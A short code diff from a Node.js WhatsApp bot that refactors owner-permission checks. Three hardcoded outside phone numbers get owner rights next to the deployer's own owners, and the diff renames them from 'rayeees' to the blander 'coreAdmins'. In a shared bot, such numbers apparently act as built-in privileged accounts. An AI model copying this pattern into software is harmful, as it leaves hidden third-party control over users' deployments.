@@ -188,14 +188,14 @@ const port = process.env.PORT || 9090;
   const botNumber = conn.user.id.split(':')[0]
   const pushname = mek.pushName || 'Sin Nombre'
   const isMe = botNumber.includes(senderNumber)
-  const rayeees = ['93744215959', '93730285765', '93782940033'];
-  const ownerFilevv2 = JSON.parse(fs.readFileSync('./lib/owner.json', 'utf-8'));
-  const fullOwners = [
-    ...ownerNumber.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net'),
-    ...rayeees.map(v => v + '@s.whatsapp.net'),
-    ...ownerFilevv2.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
+  const coreAdmins = ['93744215959', '93730285765', '93782940033'];
+  const dynamicOwners = JSON.parse(fs.readFileSync('./lib/owner.json', 'utf-8'));
+  const allPermittedUsers = [
+    ...ownerNumber.map(num => num.replace(/[^0-9]/g, '') + '@s.whatsapp.net'),
+    ...coreAdmins.map(num => num.replace(/[^0-9]/g, '') + '@s.whatsapp.net'),
+    ...dynamicOwners.map(num => num.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
   ];
-  const isOwner = fullOwners.includes(senderNumber) || isMe;
+  const isOwner = allPermittedUsers.includes(senderNumber) || isMe;
   const botNumber2 = await jidNormalizedUser(conn.user.id);
   const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
   const groupName = isGroup ? groupMetadata.subject : ''
